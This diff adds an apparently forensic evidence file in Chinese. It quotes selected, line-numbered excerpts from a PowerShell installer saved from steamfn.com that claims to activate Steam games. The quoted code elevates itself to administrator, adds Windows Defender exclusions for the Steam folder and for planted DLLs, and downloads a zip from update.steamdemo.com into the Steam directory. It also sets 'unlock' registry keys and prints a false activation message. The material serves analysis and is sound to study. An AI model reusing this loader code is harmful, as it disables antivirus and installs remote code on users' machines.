@@ -1,0 +1,239 @@
+S-02 — 安装脚本精选原始行
+源：2026-09-30 保存的 steamfn.com PowerShell 响应
+原文件字节数：16213
+原文件 SHA-256：B972FC6233B0EFC32DCC78C59002CC71ABE79FE8923EB92546B4F2F0804DC24C
+以下行号对应保存的原文件；仅收录与权限、修改目录、下载和模式相关的摘录。
+
+===== 目标注册表路径定义 =====
+0026 | $localPath = Join-Path $env:LOCALAPPDATA "steam"
+0027 | $steamRegPath = 'HKCU:\Software\Valve\Steam'
+0028 | $steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
+0029 | $steamPath = ""
+0030 | 
+
+===== 权限与重新启动 =====
+0031 | $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+0032 | if (-not $isAdmin) {
+0033 |     try {
+0034 |         if ($PSCommandPath) {
+0035 |             Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+0036 |         } else {
+0037 |             $scriptText = $MyInvocation.MyCommand.Definition
+0038 |             $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
+0039 |             Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
+0040 |         }
+0041 |     } catch {
+0042 |         Write-Host "[需要管理员权限才能继续，请右键以管理员身份运行]" -ForegroundColor Red
+0043 |         Start-Sleep 5
+0044 |     }
+0045 |     exit
+0046 | }
+0047 | 
+
+===== 条件删除帮助函数 =====
+0048 | function Remove-ItemIfExists($path) {
+0049 |     if (Test-Path $path) {
+0050 |         Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+0051 |     }
+0052 | }
+
+===== 下载成功条件及安全排除 =====
+0121 | function Get-FileFast($url, $targetPath) {
+0122 |     Remove-ItemIfExists $targetPath
+0123 |     try { Add-MpPreference -ExclusionPath $targetPath -ErrorAction SilentlyContinue } catch {}
+0124 |     Optimize-NetworkSettings
+0125 |     $ProgressPreference = 'SilentlyContinue'
+0126 | 
+0127 |     foreach ($method in @('Download-ViaHttpWebRequest', 'Download-ViaBits', 'Download-ViaWebClient')) {
+0128 |         Remove-ItemIfExists $targetPath
+0129 |         $ok = & $method $url $targetPath
+0130 |         if ($ok -and (Test-Path $targetPath) -and ((Get-Item $targetPath).Length -gt 0)) {
+0131 |             return $true
+0132 |         }
+0133 |     }
+0134 |     Remove-ItemIfExists $targetPath
+0135 |     return $false
+0136 | }
+0137 | 
+
+===== ZIP 条目路径组合与覆盖写入 =====
+0138 | function Expand-ZipTo($zipPath, $destination) {
+0139 |     if (!(Test-Path $destination)) {
+0140 |         New-Item -Path $destination -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+0141 |     }
+0142 | 
+0143 |     try {
+0144 |         Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
+0145 |         $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+0146 |         try {
+0147 |             foreach ($entry in $zip.Entries) {
+0148 |                 $targetFile = Join-Path $destination $entry.FullName
+0149 |                 if ([string]::IsNullOrEmpty($entry.Name)) {
+0150 |                     if (!(Test-Path $targetFile)) { New-Item -Path $targetFile -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+0151 |                     continue
+0152 |                 }
+0153 |                 $targetDir = Split-Path $targetFile -Parent
+0154 |                 if (!(Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+0155 |                 try {
+0156 |                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetFile, $true)
+0157 |                 } catch {
+0158 |                     try { Move-Item -Path $targetFile -Destination "$targetFile.old" -Force -ErrorAction SilentlyContinue } catch {}
+0159 |                     try { [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetFile, $true) } catch {}
+0160 |                 }
+0161 |             }
+0162 |             return $true
+0163 |         } finally {
+0164 |             $zip.Dispose()
+0165 |         }
+0166 |     } catch {}
+0167 | 
+0168 |     try {
+0169 |         if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
+0170 |             Expand-Archive -Path $zipPath -DestinationPath $destination -Force -ErrorAction Stop
+0171 |             return $true
+0172 |         }
+0173 |     } catch {}
+0174 | 
+0175 |     try {
+0176 |         $shell = New-Object -ComObject Shell.Application
+0177 |         $zipNs = $shell.NameSpace($zipPath)
+0178 |         $destNs = $shell.NameSpace($destination)
+0179 |         if ($zipNs -and $destNs) {
+0180 |             $destNs.CopyHere($zipNs.Items(), 0x10 -bor 0x4 -bor 0x400)
+0181 |             Start-Sleep -Seconds 2
+0182 |             return $true
+0183 |         }
+0184 |     } catch {}
+0185 | 
+0186 |     return $false
+0187 | }
+0188 | 
+
+===== 强制停止客户端 =====
+0189 | function ForceStopProcess($processName) {
+0190 |     Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+0191 |     Start-Sleep -Seconds 2 
+0192 |     if (Get-Process $processName -ErrorAction SilentlyContinue) {
+0193 |         Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+0194 |     }
+0195 | }
+0196 | 
+
+===== 从注册表读取目标 =====
+0207 | ForceStopProcess "steam"
+0208 | if (Get-Process "steam" -ErrorAction SilentlyContinue) {
+0209 |     CheckAndPromptProcess "Steam" "[请先退出 Steam 客户端]"
+0210 | }
+0211 | 
+0212 | if (Test-Path $steamRegPath) {
+0213 |     $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+0214 |     if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
+0215 |         $steamPath = $properties.SteamPath
+0216 |     }
+0217 | }
+0218 | if ([string]::IsNullOrWhiteSpace($steamPath)) {
+0219 |     Write-Host "您的电脑没有安装官方正版 Steam 客户端，请安装后再次尝试。" -ForegroundColor Red
+0220 |     Start-Sleep 10
+0221 |     exit
+0222 | }
+0223 | 
+0224 | if (-not (Test-Path $steamPath -PathType Container)) {
+0225 |     Write-Host "您的电脑没有安装官方正版 Steam 客户端，请安装后再次尝试。" -ForegroundColor Red
+0226 |     Start-Sleep 10
+0227 |     exit
+0228 | }
+0229 | 
+0230 | $steamConfigPath = Join-Path $steamPath "config"
+0231 | $hidPath = Join-Path $steamPath "xinput1_4.dll"
+0232 | 
+0233 | $xinputPath = Join-Path $steamPath "user32.dll"
+0234 | Remove-ItemIfExists $xinputPath
+0235 | 
+
+===== 部署、资源地址、解压与模式设置 =====
+0236 | function PwStart() {
+0237 |     try {
+0238 |         if (!$steamPath) {
+0239 |             return
+0240 |         }
+0241 |         if (!(Test-Path $localPath)) {
+0242 |             New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
+0243 |         }
+0244 |         
+0245 |         $hidDllPath = Join-Path $steamPath "hid.dll"
+0246 |         Remove-ItemIfExists $hidDllPath
+0247 |         
+0248 |         $steamCfgFilePath = Join-Path $steamPath "steam.cfg"
+0249 |         Remove-ItemIfExists $steamCfgFilePath
+0250 |         
+0251 |         $steamBetaPath = Join-Path $steamPath "package\beta"
+0252 |         Remove-ItemIfExists $steamBetaPath
+0253 |         
+0254 |         $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+0255 |         Remove-ItemIfExists $catchPath
+0256 |         try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+0257 |         try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}
+0258 | 
+0259 |         $versionDllPath = Join-Path $steamPath "version.dll"
+0260 |         Remove-ItemIfExists $versionDllPath
+0261 | 
+0262 |         $dwmapiPath = Join-Path $steamPath "dwmapi.dll"
+0263 |         try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}
+0264 | 
+0265 |         $resUrl = "http://update.steamdemo.com/res.zip"
+0266 |         $zipPath = Join-Path $env:TEMP "res.zip"
+0267 |         Remove-ItemIfExists $zipPath
+0268 |         try { Add-MpPreference -ExclusionPath $zipPath -ErrorAction SilentlyContinue } catch {}
+0269 | 
+0270 |         $downloadOk = Get-FileFast $resUrl $zipPath
+0271 |         if ((-not $downloadOk) -or (-not (Test-Path $zipPath)) -or ((Get-Item $zipPath).Length -eq 0)) {
+0272 |             Remove-ItemIfExists $zipPath
+0273 |             Write-Host "[网络获取文件失败，请检查网络后重试]" -ForegroundColor Red
+0274 |             Start-Sleep 10
+0275 |             return
+0276 |         }
+0277 | 
+0278 |         $extractOk = Expand-ZipTo $zipPath $steamPath
+0279 |         Remove-ItemIfExists $zipPath
+0280 |         if (-not $extractOk) {
+0281 |             Write-Host "[资源解压失败，请重试]" -ForegroundColor Red
+0282 |             Start-Sleep 10
+0283 |             return
+0284 |         }
+0285 |         
+0286 |         if (!(Test-Path $steamToolsRegPath)) {
+0287 |             New-Item -Path $steamToolsRegPath -Force | Out-Null
+0288 |         }
+0289 |         
+0290 |         Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
+0291 |         Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
+0292 |         Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
+0293 |         
+0294 |         Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String
+0295 |         
+
+===== 重新启动客户端 =====
+0296 |         $steamExePath = Join-Path $steamPath "steam.exe"
+0297 |         $launched = $false
+0298 |         try {
+0299 |             if (Test-Path $steamExePath) {
+0300 |                 Start-Process explorer.exe -ArgumentList "`"$steamExePath`"" -ErrorAction Stop
+0301 |                 $launched = $true
+0302 |             }
+0303 |         } catch {}
+0304 |         if (-not $launched) {
+0305 |             try {
+0306 |                 if (Test-Path $steamExePath) {
+0307 |                     Start-Process $steamExePath -ErrorAction Stop
+0308 |                     $launched = $true
+0309 |                 }
+0310 |             } catch {}
+0311 |         }
+0312 |         if (-not $launched) {
+0313 |             try {
+0314 |                 Start-Process "steam://" -ErrorAction Stop
+0315 |                 $launched = $true
+0316 |             } catch {}
+0317 |         }
+0318 |         Write-Host "[已成功连接正版激活服务器，请登录Steam来激活]" -ForegroundColor Green
+0319 | 
